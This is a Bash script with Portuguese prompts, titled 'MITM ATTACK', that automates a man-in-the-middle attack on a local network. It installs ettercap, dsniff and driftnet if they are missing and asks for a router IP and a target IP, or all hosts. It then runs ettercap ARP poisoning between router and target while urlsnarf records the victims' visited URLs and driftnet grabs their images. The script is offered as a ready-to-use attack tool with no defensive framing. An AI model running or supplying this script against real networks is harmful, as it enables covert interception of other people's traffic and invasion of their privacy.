#!/bin/bash
[ $(id -u) -ne 0 ] && { echo -e "Execute como root"; sudo ./mitm.sh ; exit ;} || echo -e "Root permitted"

 #aqui inicia a verificação de pacotes para instalação
echo -e "Estamos analisando os pacotes necessários...\n"
pacote=$(dpkg --get-selections | grep ettercap-text-only )
if [ -n "$pacote" ] ;
  sleep 1
 then
     echo -e "Ettercap -------------------------------------- OK\n"
 else
     echo -e "Ettercap ----------------------------- Nao instalado\n"
     echo "A aplicação ettercap-text-only será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install ettercap-text-only
fi
pacote=$(dpkg --get-selections | grep dsniff )
if [ -n "$pacote" ] ;
 then
     echo -e "Urlsnarf -------------------------------------- OK\n"
 else 
     echo -e "Urlsnarf ----------------------------- Nao instalado\n"
     echo "A aplicação Urlsnarf será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install dsniff
fi
pacote=$(dpkg --get-selections | grep driftnet ) 
if [ -n "$pacote" ] ;
 then
     echo -e "Driftnet -------------------------------------- OK\n"
 else
     echo -e "Driftnet ----------------------------- Nao instalado\n"
     echo "A aplicação Driftnet será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install driftnet
fi
pacote=$(dpkg --get-selections | grep figlet )
if [ -n "$pacote" ] ;
 then 
     echo -e "Figlet ---------------------------------------- OK\n"
 else
     echo -e "Figlet ----------------------------- Nao instalado\n"
     echo "A aplicação Figlet será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install figlet
fi
pacote=$(dpkg --get-selections | grep dialog )
if [ -n "$pacote" ] ;
 then 
     echo -e "Dialog ---------------------------------------- OK\n"
 else
     echo -e "Dialog ----------------------------- Nao instalado\n"
     echo "A aplicação Dialog será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install dialog
fi
clear
#aqui inicia a coleta de dados para o ataque
sleep 1
figlet "         MITM ATTACK"
echo -e "V.0.1.2\n"
echo -e "By: Lucas Silva | Twitter: @SrSniffer\n"
echo "Deseja visualizar o IP de seu roteador s/n?"
 read v0
if [ "$v0" = s ] ;
 then 
    route -n
    echo
    echo "Digite o numero correspondente a sua interface de rede"
    echo "1- Cabeada"
    echo "2- Wireless"
    read IF
    echo "Insira o IP de seu roteador"
    read IP
    echo
    echo "OBS: Para realizar o ataque em todos os hosts tecle [ENTER]."
    echo "Insira o IP do alvo"
    read alvo
   if [ "$IF" =  2 ] ;
     then
      gnome-terminal -x bash -c "ettercap -T -q -i wlp3s0 -M arp:remote /$IP/$alvo/; exec $SHELL";
      gnome-terminal -x bash -c "urlsnarf -i wlp3s0; exec $SHELL";
      driftnet -i wlp3s0
      exit
     else
      gnome-terminal -x bash -c "ettercap -T -q -i lo -M arp:remote /$IP/$alvo/; exec $SHELL";
      gnome-terminal -x bash -c "urlsnarf -i lo; exec $SHELL";
      driftnet -i lo
      exit
   fi
else
    echo
    echo "Digite o numero correspondente a sua interface de rede"
    echo "1- Cabeada"
    echo "2- Wireless"
    read IF

    echo "Insira o IP de seu roteador"
    read IP
    echo
    echo "OBS: Para realizar o ataque em todos os hosts tecle [ENTER]."
    echo "Insira o IP do alvo,"
    read alvo
fi

#após a coleta aqui iniciará o ataque de acordo com os dados solicitados
if [ "$IF" =  2 ] ;
 then
   gnome-terminal -x bash -c "ettercap -T -q -i wlp3s0 -M arp:remote /$IP/$alvo/; exec $SHELL";
   gnome-terminal -x bash -c "urlsnarf -i wlp3s0; exec $SHELL";
   driftnet -i wlp3s0
   exit
 else
   gnome-terminal -x bash -c "ettercap -T -q -i lo -M arp:remote /$IP/$alvo/; exec $SHELL";
   gnome-terminal -x bash -c "urlsnarf -i lo; exec $SHELL";
   driftnet -i lo
   exit
fi
